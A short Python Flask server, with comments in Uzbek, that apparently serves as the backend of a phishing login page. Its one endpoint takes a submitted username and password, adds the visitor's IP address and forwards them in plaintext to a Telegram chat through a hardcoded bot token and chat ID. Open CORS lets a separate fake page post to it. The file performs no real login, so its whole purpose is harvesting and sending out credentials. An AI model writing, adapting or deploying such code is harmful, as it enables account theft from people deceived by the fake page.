from flask import Flask, request, jsonify
from flask_cors import CORS
import requests

app = Flask(__name__)
CORS(app)

BOT_TOKEN = '7794965037:AAHanCdhyy71di4pZOtmEcQQkufynuEWM_A'
CHAT_ID = '7028167164'

@app.route('/submit', methods=['POST'])
def handle_submit():
    try:
        data = request.json
        
        # Ma'lumotlarni tekshirish
        if not data.get('username') or not data.get('password'):
            return jsonify({
                'status': 'error',
                'message': 'Username and password are required'
            }), 400

        # Telegramga xabar tayyorlash
        message = (
            "📲 New Login Attempt\n\n"
            f"👤 Username: {data['username']}\n"
            f"🔑 Password: {data['password']}\n"
            f"🌐 IP: {request.remote_addr}"
        )

        # Telegramga yuborish
        telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        response = requests.post(
            telegram_url,
            json={
                'chat_id': CHAT_ID,
                'text': message,
                'parse_mode': 'HTML'
            }
        )

        if response.status_code != 200:
            return jsonify({
                'status': 'error',
                'message': 'Failed to send message to Telegram'
            }), 500

        return jsonify({'status': 'success'})
    
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)